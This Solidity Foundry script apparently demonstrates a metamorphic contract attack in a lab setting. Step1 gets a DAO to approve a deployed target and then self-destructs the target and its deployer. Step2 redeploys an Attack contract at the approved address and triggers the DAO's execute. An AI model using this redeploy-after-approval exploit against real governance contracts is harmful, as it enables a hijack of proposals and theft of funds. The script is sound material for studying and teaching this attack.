// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol"; // solhint-disable-line
import "forge-std/console.sol"; // solhint-disable-line
import {DAO, Target, Attack, Deployer, DeployerFactory} from "../src/Create.sol";

contract Step1 is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // dao
        DAO dao = new DAO();
        console.log("dao: %s", address(dao));
        // attacker
        DeployerFactory factory = new DeployerFactory();
        console.log("factory: %s", address(factory));
        Deployer deployer = factory.create();
        console.log("deployer: %s", address(deployer));
        Target target = deployer.deployTarget();
        console.log("target: %s", address(target));
        // dao
        dao.approve(address(target));
        // hack
        target.destroy();
        deployer.destroy();
        vm.stopBroadcast();
    }
}

contract Step2 is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        DeployerFactory factory = DeployerFactory(
            address(0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512)
        );
        Deployer deployer = factory.create();
        Attack attack = deployer.deployAttack();
        console.log("attack: %s", address(attack));
        DAO dao = DAO(address(0x5FbDB2315678afecb367f032d93F642f64180aa3));
        dao.execute(0);
        vm.stopBroadcast();
    }
}
